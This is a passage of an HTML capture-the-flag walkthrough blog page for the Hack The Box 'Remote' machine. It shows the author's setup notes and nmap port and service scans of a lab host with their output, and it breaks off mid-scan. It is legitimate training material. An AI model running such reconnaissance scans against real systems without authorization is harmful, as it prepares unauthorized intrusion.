<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.140.2">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Remote HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Remote HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/redpanda-box/" title="./walkthroughs/redpanda-box/">
                        
                            RedPanda HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sau-box/" title="./walkthroughs/sau-box/">
                        
                            Sau HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/love-box/" title="./walkthroughs/love-box/">
                        
                            Love HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/editorial-box/" title="./walkthroughs/editorial-box/">
                        
                            Editorial HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/doctor-box/" title="./walkthroughs/doctor-box/">
                        
                            Doctor HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/forest-box/" title="./walkthroughs/forest-box/">
                        
                            Forest HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/driver-box/" title="./walkthroughs/driver-box/">
                        
                            Driver HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
                        
                            Timelapse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
                        
                            Certified HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
                        
                            Aero HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
                        
                            Administrator HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
                        
                            Sauna HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
                        
                            Active HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
                        
                            Cicada HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
                        
                            Authority HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
                        
                            EvilCUPS HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
                        
                            Resolute HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
                        
                            Fuse HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingasreproasting/" title="./articles/understandingasreproasting/">
                        
                            Understanding AS-REP Roasting Attacks: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
                        
                            Understanding PowerShell Download Cradles: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
                        
                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
                        
                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
                        
                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
                        
                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
                        
                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Tools </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
                        
                            LDAPire: LDAP Enumeration Tool
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
                        
                            Automating Kali VM Setup with QEMU
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
                        
                            BloodServer: A Secure File Transfer Tool for Penetration Testers
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
                        
                            Attacking LDAP: Deep Dive &amp; Cheatsheet
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            Attacking RPC: Deep Dive &amp; Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/escapetwo-box/" title="./escapetwo-box/">
                        
                            EscapeTwo HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Remote HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.09.09"
                            >2024.09.09
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        13 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/easy/"
                            class="tag-btn">
                            Easy
                        </a>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/seimpersonateprivilege/"
                            class="tag-btn">
                            SeImpersonatePrivilege
                        </a>
                    
                        <a
                            href="/tags/umbraco/"
                            class="tag-btn">
                            Umbraco
                        </a>
                    
                        <a
                            href="/tags/csharp/"
                            class="tag-btn">
                            CSharp
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/remote-box/" class="bread-btn">
    

    
        
            Remote HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#name-of-box-remote">Hack The Box Remote Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#nmap-scans">NMAP-Scans:</a></li>
        <li><a href="#ftp-21-enumeration">FTP 21 Enumeration:</a></li>
        <li><a href="#smb-445-enumeration">SMB 445 Enumeration:</a></li>
        <li><a href="#nfs-2049-enumeration">NFS 2049 Enumeration:</a></li>
        <li><a href="#the-hunt-for-credentials">The hunt for credentials:</a></li>
        <li><a href="#cracking-the-hashes">Cracking the hashes:</a></li>
        <li><a href="#http-enumeration">HTTP Enumeration:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#getting-rce-with-public-exploits">Getting RCE with public exploits:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-privesc">3. Privesc:</a>
      <ul>
        <li><a href="#seimpersonateprivilege-explained">SeImpersonatePrivilege Explained:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-ownership">4. Ownership:</a></li>
    <li><a href="#5-dot-persistence">5. Persistence:</a></li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="name-of-box-remote">Hack The Box Remote Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Remote">https://app.hackthebox.com/machines/Remote</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</h2>
<ul>
<li><strong>Variables</strong>:
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Wordlists</strong>:
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="nmap-scans">NMAP-Scans:</h3>
<h4 id="basic-scan">Basic Scan:</h4>
<ul>
<li>
<p>I do this simple scan just get a lay of the land:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2040-49_Career/46-Boxes/46.02-HTB/Remote/scans%20%202GiB/7GiB%20%7c%20524MiB/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2009:02:23%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-sT%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-08%2009:02%20BST%0aNmap%20scan%20report%20for%2010.129.200.122%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%20993%20closed%20tcp%20ports%20%28conn-refused%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a21/tcp%20%20%20open%20%20ftp%0a80/tcp%20%20%20open%20%20http%0a111/tcp%20%20open%20%20rpcbind%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a445/tcp%20%20open%20%20microsoft-ds%0a2049/tcp%20open%20%20nfs%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%207.18%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans  2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>🕙 09:02:23 zsh ❯ nmap $box -Pn -sT
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-08 09:02 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.200.122
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">993</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>21/tcp   open  ftp
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>2049/tcp open  nfs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.18 seconds</span></span></code></pre></div>
    
</div>
<ul>
<li>We can see there is some low hanging fruit FTP, SMB, NFS &amp; HTTP we will enumerate these whilst we have a more intensive NMAP Scan run:</li>
</ul>
</li>
</ul>
<h4 id="in-depth-scan">In-Depth Scan:</h4>
<ul>
<li>More in depth scan</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%2040-49_Career/46-Boxes/46.02-HTB/Remote/scans%20%202GiB/7GiB%20%7c%20524MiB/1GiB%20with%20/usr/bin/zsh%20%20took%2017s%0a%f0%9f%95%99%2009:06:54%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20--disable-arp-ping%20-Pn%20-oA%20FullTCP%20$box%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-09-08%2009:07%20BST%0aNmap%20scan%20report%20for%2010.129.200.122%0aHost%20is%20up%20%280.037s%20latency%29.%0aNot%20shown:%2065519%20closed%20tcp%20ports%20%28reset%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a21/tcp%20%20%20%20open%20%20ftp%20%20%20%20%20%20%20%20%20%20%20Microsoft%20ftpd%0a%7c_ftp-anon:%20Anonymous%20FTP%20login%20allowed%20%28FTP%20code%20230%29%0a%7c%20ftp-syst:%0a%7c_%20%20SYST:%20Windows_NT%0a80/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-title:%20Home%20-%20Acme%20Widgets%0a111/tcp%20%20%20open%20%20rpcbind?%0a%7c_rpcinfo:%20ERROR:%20Script%20execution%20failed%20%28use%20-d%20to%20debug%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a2049/tcp%20%20open%20%20mountd%20%20%20%20%20%20%20%201-3%20%28RPC%20#100005%29%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a47001/tcp%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a49664/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49665/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49666/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49678/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49679/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49680/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aNo%20exact%20OS%20matches%20for%20host%20%28If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20%29.%0aTCP/IP%20fingerprint:%0aOS:SCAN%28V=7.94SVN%25E=4%25D=9/8%25OT=21%25CT=1%25CU=44443%25PV=Y%25DS=2%DC=I%25G=Y%25TM=66DD5%0aOS:BE2%25P=x86_64-pc-linux-gnu%29SEQ%28SP=106%25GCD=1%25ISR=10C%25TI=I%25CI=I%25II=I%25SS=S%25T%0aOS:S=U%29SEQ%28SP=106%25GCD=2%25ISR=10C%25TI=I%25CI=I%25II=I%25SS=S%25TS=U%29OPS%28O1=M53CNW8NNS%25%0aOS:O2=M53CNW8NNS%25O3=M53CNW8%25O4=M53CNW8NNS%25O5=M53CNW8NNS%25O6=M53CNNS%29WIN%28W1=F%0aOS:FFF%25W2=FFFF%25W3=FFFF%25W4=FFFF%25W5=FFFF%25W6=FF70%29ECN%28R=Y%DF=Y%25T=80%25W=FFFF%25O=M%0aOS:53CNW8NNS%CC=Y%25Q=%29T1%28R=Y%DF=Y%25T=80%25S=O%25A=S&#43;%25F=AS%25RD=0%25Q=%29T2%28R=Y%DF=Y%25T=8%0aOS:0%25W=0%25S=Z%25A=S%25F=AR%25O=%25RD=0%25Q=%29T3%28R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=O%25F=AR%25O=%25RD=0%25%0aOS:Q=%29T4%28R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25RD=0%25Q=%29T5%28R=Y%DF=Y%25T=80%25W=0%25S=Z%25%0aOS:A=S&#43;%25F=AR%25O=%25RD=0%25Q=%29T6%28R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25RD=0%25Q=%29T7%28R=Y%25%0aOS:DF=Y%25T=80%25W=0%25S=Z%25A=S&#43;%25F=AR%25O=%25RD=0%25Q=%29U1%28R=Y%DF=N%25T=80%25IPL=164%25UN=0%25RIP%0aOS:L=G%25RID=G%25RIPCK=G%25RUCK=G%25RUD=G%29IE%28R=Y%DFI=N%25T=80%CD=Z%29%0a%0aNetwork%20Distance:%202%20hops%0aService%20Info:%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c_clock-skew:%2059m59s%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-09-08T09:09:49%0a%7c_%20%20start_date:%20N/A%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20but%20not%20required%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20143.44%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans  2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh  took 17s
</span></span><span style="display:flex;"><span>🕙 09:06:54 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-08 09:07 BST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.200.122
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
